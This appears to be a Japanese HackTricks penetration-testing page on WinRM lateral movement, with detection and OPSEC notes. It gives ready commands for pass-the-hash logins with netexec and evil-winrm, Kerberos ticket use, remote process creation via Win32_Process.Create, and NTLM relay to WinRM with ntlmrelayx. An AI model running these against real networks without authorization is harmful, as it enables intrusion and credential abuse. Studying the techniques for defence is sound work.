# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRMは、SMBのサービス作成テクニックを使わずに**WS-Man/HTTP(S)**経由でリモートシェルを使えるため、Windows環境で最も便利な**lateral movement**手段の1つです。ターゲットが**5985/5986**を公開しており、ユーザーアカウントにリモート接続の権限があれば、「有効な認証情報」から「対話型シェル」へすばやく移行できることがよくあります。

**プロトコル/サービスの列挙**、リスナー、WinRMの有効化、`Invoke-Command`、一般的なクライアントの使用方法については、以下を参照してください。

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## WinRMが好まれる理由

- SMB/RPCではなく**HTTP/HTTPS**を使用するため、PsExec形式の実行がブロックされる環境でも動作することがよくあります。
- **Kerberos**を使えば、再利用可能な認証情報をターゲットに送信せずに済みます。
- **Windows**、**Linux**、**Python**のツール（`winrs`、`evil-winrm`、`pypsrp`、`netexec`）から問題なく利用できます。
- 対話型のPowerShellリモート接続では、認証されたユーザーのコンテキストでターゲット上に**`wsmprovhost.exe`**が起動します。これは、サービスベースの実行とは運用上異なります。

## アクセスモデルと前提条件

実際には、WinRMによるlateral movementの成功は、次の**3つ**に左右されます。

1. ターゲットに**WinRMリスナー**（`5985`/`5986`）があり、アクセスを許可するファイアウォールルールが設定されている。
2. アカウントがエンドポイントに対して**認証**できる。
3. アカウントに**リモート接続セッションを開く**権限がある。

アクセス権を得る一般的な方法は次のとおりです。

- ターゲットの**Local Administrator**である。
- 新しいシステムでは**Remote Management Users**、またはそのグループが引き続き有効なシステム/コンポーネントでは**WinRMRemoteWMIUsers__**のメンバーである。
- ローカルセキュリティ記述子やPowerShellリモート接続ACLの変更を通じて、明示的に委任されたリモート接続権限を持つ。

管理者権限で制御できるマシンがある場合、以下で説明されている手法を使えば、完全な管理者グループへの所属なしに**WinRMアクセスを委任**することもできます。

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### lateral movementで重要な認証上の注意点

- **Kerberosにはホスト名/FQDNが必要です**。IPアドレスで接続すると、通常、クライアントは**NTLM/Negotiate**にフォールバックします。
- **ワークグループ**環境や信頼関係をまたぐ一部のケースでは、NTLMを使うには通常、**HTTPS**を使用するか、クライアント側でターゲットを**TrustedHosts**に追加する必要があります。
- ワークグループ環境でNegotiate経由の**ローカルアカウント**を使う場合、組み込みのAdministratorアカウントを使用するか、`LocalAccountTokenFilterPolicy=1`を設定しないと、UACのリモート制限によってアクセスできないことがあります。
- PowerShellリモート接続では、デフォルトで**`HTTP/<host>` SPN**を使用します。環境内ですでに`HTTP/<host>`が別のサービスアカウントに登録されていると、WinRM Kerberosが`0x80090322`で失敗することがあります。その場合は、ポートを含むSPNを使うか、そのSPNが存在する場合は**`WSMAN/<host>`**に切り替えてください。<sup>[[3]](#references)</sup>

password sprayingで有効な認証情報を入手した場合、WinRM経由で検証するのが、それらの認証情報でシェルを利用できるかどうかを確認する最も速い方法であることがよくあります。

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## LinuxからWindowsへのlateral movement

### 検証と単発実行に使うNetExec / CrackMapExec

```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```

### Evil-WinRM による対話型シェル

Linux では、`evil-winrm` が引き続き最も便利な対話型オプションです。**パスワード**、**NT hash**、**Kerberos ticket**、**クライアント証明書**、ファイル転送、メモリ内での PowerShell/.NET 読み込みに対応しています。

```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```

### Kerberos SPN のエッジケース: `HTTP` vs `WSMAN`

デフォルトの **`HTTP/<host>`** SPN が原因で Kerberos の失敗が発生する場合は、代わりに **`WSMAN/<host>`** チケットの要求または使用を試してください。これは、`HTTP/<host>` がすでに別のサービスアカウントに割り当てられている、セキュリティ強化済みの環境や特殊なエンタープライズ環境で見られます。<sup>[[3]](#references)</sup>

```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```

これは、汎用的な `HTTP` チケットではなく、特に **WSMAN** サービスチケットを偽造または要求した場合に、**RBCD / S4U** の悪用後にも役立ちます。

### 証明書ベースの認証

WinRM は**クライアント証明書認証**もサポートしていますが、証明書はターゲット上の**ローカルアカウント**にマッピングされている必要があります。攻撃者の視点では、次のような場合に重要です。

- WinRM 用にすでにマッピングされている有効なクライアント証明書と秘密鍵を盗み出した、またはエクスポートした場合。
- **AD CS / Pass-the-Certificate** を悪用してプリンシパルの証明書を取得し、別の認証経路へピボットする場合。
- パスワードベースのリモート操作を意図的に避けている環境で活動している場合。

```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```

Client-certificate WinRM は password/hash/Kerberos 認証よりはるかに一般的ではありませんが、利用できる場合は、パスワードローテーション後も有効な **passwordless lateral movement** の経路になります。

### `pypsrp` を使った Python / automation

operator shell ではなく automation が必要な場合、`pypsrp` を使うと、Python から **NTLM**、**certificate auth**、**Kerberos**、**CredSSP** に対応した WinRM/PSRP を利用できます。<sup>[[2]](#references)</sup>

```python
from pypsrp.client import Client

client = Client(
    "srv01.domain.local",
    username="DOMAIN\\user",
    password="Password123!",
    ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```


高レベルの `Client` wrapper より細かく制御したい場合、低レベルの `WSMan` + `RunspacePool` API は、次の2つの一般的なオペレーターの課題に役立ちます。

- 多くの PowerShell クライアントがデフォルトで想定する `HTTP` ではなく、Kerberos service/SPN として **`WSMAN`** を強制する。
- **`Microsoft.PowerShell`** ではなく、**JEA** / カスタムセッション構成などの**デフォルト以外の PSRP endpoint** に接続する。

```python
from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool

wsman = WSMan(
    "srv01.domain.local",
    auth="kerberos",
    ssl=False,
    negotiate_service="WSMAN",
)

with wsman, RunspacePool(wsman, configuration_name="MyJEAEndpoint") as pool, PowerShell(pool) as ps:
    ps.add_script("whoami; Get-Command")
    output = ps.invoke()
    print(output)
```

### lateral movement ではカスタム PSRP endpoint と JEA が重要

WinRM authentication に成功しても、必ずしもデフォルトの制限なし `Microsoft.PowerShell` endpoint に接続できるとは限りません。成熟した環境では、独自の ACL や run-as 動作を持つ**カスタム session configuration**や **JEA** endpoint が公開されていることがあります。<sup>[[1]](#references)</sup>

すでに Windows host で code execution を取得していて、どのような remoting の接続先が存在するかを調べたい場合は、登録済み endpoint を列挙します。

```powershell
Get-PSSessionConfiguration | Select-Object Name, Permission
```

有用な endpoint が存在する場合は、デフォルトの shell ではなく、その endpoint を明示的にターゲットにします:

```powershell
Enter-PSSession -ComputerName srv01.domain.local -ConfigurationName MyJEAEndpoint
```

実践的な攻撃上の意味:

- **制限付き** endpoint でも、サービス制御、ファイルアクセス、プロセス作成、任意の .NET / 外部コマンド実行に必要な cmdlet/function だけが公開されていれば、lateral movement に十分な場合があります。
- **設定ミスのある JEA** role は、`Start-Process`、広範なワイルドカード、書き込み可能な provider、または意図した制限を回避できるカスタム proxy function など、危険なコマンドが公開されている場合に特に価値があります。
- **RunAs virtual account** または **gMSA** を使用する endpoint は、実行するコマンドの実効セキュリティコンテキストを変えます。特に、gMSA を使用する endpoint は、通常の WinRM session が従来の delegation の問題に直面する場合でも、2 ホップ目で **ネットワーク ID** を提供できます。

カスタムの制限付き endpoint では、実効コマンド権限と script 権限を別々に調べてください。`Get-Command` の一覧が短いだけでは、既存の `.ps1` を実行できないことの証明にはなりません。[JEA role capabilities](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/role-capabilities) では、呼び出し可能な script path が明示的に制御されます。他のカスタム endpoint では、異なる session ルールが適用されることがあります。許可された script が保存済みの `SecureString` を使って別の host 用の credential を作成する場合、明示的な key を指定せずに作成された blob には [Windows DPAPI](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) が使われ、通常、復号には保護時の user と machine のコンテキストが必要です。書き込み可能なソースやコピーされた blob をホスト間の権限昇格経路とみなす前に、script の ACL、許可された呼び出し方法、run-as identity、および後続の credential 権限を確認してください。受動的な列挙中に保護された値を表示してはいけません。

ファイルパスを受け取る JEA カスタム function では、登録済み endpoint の ACL、割り当てられた role capability、実効 run-as identity を合わせて確認してください。呼び出し元が `NoLanguage` でも、function 本体はシステムの既定の language mode で実行される場合があります。また、virtual account にローカル管理者権限がある場合もあります。function が許可されたディレクトリを単純な文字列 prefix で確認し、その後、指定されたパスを読み込む場合、`..` の要素によってそのディレクトリ外を参照できることがあります。境界となるのは、呼び出し元の language mode や見かけ上の prefix ではなく、function の identity で解決されたパスです。読み取り可能な `.psrc` または `.pssc` ファイルを特権ファイル読み取りの finding とみなす前に、到達可能な function と最終パスの検証を確認してください。Microsoft の [JEA role capability](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/role-capabilities) および[セキュリティに関する考慮事項](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations)のガイダンスを参照してください。

## Windowsネイティブの WinRM lateral movement

### `winrs.exe`

`winrs.exe` は組み込みツールであり、対話型の PowerShell remoting session を開かずに **ネイティブの WinRM コマンド実行**を行いたい場合に便利です:

```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```

実際の利用時に忘れやすく、重要なフラグが2つあります。

- `/noprofile` は、リモートプリンシパルがローカル管理者ではない場合によく必要になります。
- `/allowdelegate` を有効にすると、リモートシェルから自分の認証情報を **3台目のホスト** に対して使用できます（たとえば、コマンドで `\\fileserver\share` が必要な場合）。

```cmd
winrs -r:srv01.domain.local /noprofile cmd /c set
winrs -r:srv01.domain.local /allowdelegate cmd /c dir \\fileserver.domain.local\share
```

運用上、`winrs.exe` を使用すると、一般に次のようなリモートプロセスの連鎖が発生します。

```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```

これは、service-based exec や interactive PSRP sessions とは異なるため、覚えておく価値があります。

### `winrm.cmd` / PowerShell remoting ではなく WS-Man COM

`Enter-PSSession` を使わずに、WS-Man 経由で WMI クラスを呼び出して **WinRM transport** 経由で実行することもできます。これにより、transport は WinRM のまま、リモート実行のプリミティブは **WMI `Win32_Process.Create`** になります:

```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```

そのアプローチは、次の場合に有用です。

- PowerShell logging が厳重に監視されている。
- **WinRM transport** は使いたいが、従来の PS remoting workflow は使いたくない。
- **`WSMan.Automation`** COM object を利用したカスタムツールを開発または使用している。

## NTLM relay to WinRM (WS-Man)

SMB relay が signing によってブロックされ、LDAP relay に制約がある場合でも、**WS-Man/WinRM** は魅力的な relay target となる可能性があります。最新の `ntlmrelayx.py` には **WinRM relay servers** が含まれており、**`wsman://`** または **`winrms://`** の target に relay できます。

```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```

実用上の注意点が2つあります。

- Relayが最も有効なのは、ターゲットが**NTLM**を受け入れ、かつリレーされたプリンシパルにWinRMの使用が許可されている場合です。
- 最近のImpacketコードは、**`WSMANIDENTIFY: unauthenticated`**リクエストを特別に処理するため、`Test-WSMan`形式のプローブでRelayフローが中断されることはありません。

最初のWinRMセッションを確立した後のマルチホップ制約については、こちらを確認してください。

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## OPSECと検知に関する注意点

- **対話型PowerShell remoting**では、通常、ターゲット上に**`wsmprovhost.exe`**が作成されます。
- **`winrs.exe`**では、一般に**`winrshost.exe`**と、その後に要求された子プロセスが作成されます。
- カスタム**JEA**エンドポイントでは、**`WinRM_VA_*`**仮想アカウントまたは設定済みの**gMSA**としてアクションが実行されることがあり、通常のユーザーコンテキストのシェルとはテレメトリとセカンドホップの動作が異なります。<sup>[[1]](#references)</sup>
- PSRPを使う場合、raw `cmd.exe`とは異なり、ネットワークログオンのテレメトリ、WinRMサービスイベント、PowerShellのOperationalログやスクリプトブロックログが記録されることを想定してください。
- コマンドを1つだけ実行する場合、長時間の対話型remotingセッションより、`winrs.exe`や1回限りのWinRM実行のほうが目立ちにくい場合があります。
- Kerberosが利用できる場合は、IP + NTLMよりも**FQDN + Kerberos**を優先してください。信頼関係の問題と、クライアント側での面倒な`TrustedHosts`変更の両方を減らせます。

## References

- [1] [Microsoft: JEAのセキュリティに関する考慮事項](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations?view=powershell-7.6)
- [2] [pypsrp README](https://github.com/jborean93/pypsrp)
- [3] [Microsoft: WinRM経由でPowerShellをリモートサーバーに接続する際のエラー`0x80090322`](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)
{{#include ../../banners/hacktricks-training.md}}
